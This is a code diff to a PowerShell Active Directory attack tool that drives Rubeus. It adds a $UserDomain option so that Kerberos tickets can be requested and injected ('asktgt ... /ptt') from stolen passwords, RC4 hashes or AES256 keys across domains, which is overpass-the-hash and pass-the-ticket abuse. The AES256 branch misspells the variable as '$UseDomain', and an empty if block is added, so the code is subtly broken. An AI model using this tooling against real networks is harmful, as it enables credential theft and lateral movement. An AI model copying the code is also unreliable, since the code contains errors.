@@ -34,7 +34,7 @@ Param(
     [String]$AllDomains = "",
 
     [Parameter(Mandatory=$False, Position=10, ValueFromPipeline=$true)]
-    [String]$SourceDomain = "",
+    [String]$UserDomain = "",
 
     [Parameter(Mandatory=$False, Position=11, ValueFromPipeline=$true)]
     [String]$LocalFileServer = "",
@@ -518,6 +518,9 @@ function Invoke-Rubeus{
 ################################################################################################################
 ##################################### Ticket logic for authentication ##########################################
 ################################################################################################################
+# Set the userDomain when impersonating a user in one domain for access to an alternate domain
+if ($UserDomain -ne ""){}
+
 
 # Set the variable "CurrentUser" to $True if the switch -GenRelayList is used.
 if (
@@ -629,7 +632,10 @@ if (!$CurrentUser) {
     }
        elseif ($Password -ne "") {
             klist purge | Out-Null
-            $AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"
+            
+            if ($UserDomain -ne ""){$AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"}
+            elseif ($UserDomain -eq ""){$AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"}
+            
         if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*"){
             Write-Host "[-] " -ForegroundColor "Red" -NoNewline
             Write-Host "Incorrect password or username"
@@ -650,8 +656,10 @@ if (!$CurrentUser) {
        elseif ($Hash -ne "") {
         if ($Hash.Length -eq 32) {
         klist purge | Out-Null
-        $AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"
-
+        
+        if ($UserDomain -ne ""){$AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"}
+        if ($UserDomain -eq ""){$AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"}
+        
         if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*"){
             Write-Host "[-] " -ForegroundColor "Red" -NoNewline
             Write-Host "Incorrect hash or username"
@@ -670,7 +678,9 @@ if (!$CurrentUser) {
     }
        elseif ($Hash.Length -eq 64) {
         klist purge | Out-Null
-        $Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"
+
+        if ($UserDomain -ne ""){$Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UseDomain /aes256:$Hash /opsec /force /ptt"}
+        if ($UserDomain -eq ""){$Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"}
 
         if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*"){
             Write-Host "[-] " -ForegroundColor "Red" -NoNewline
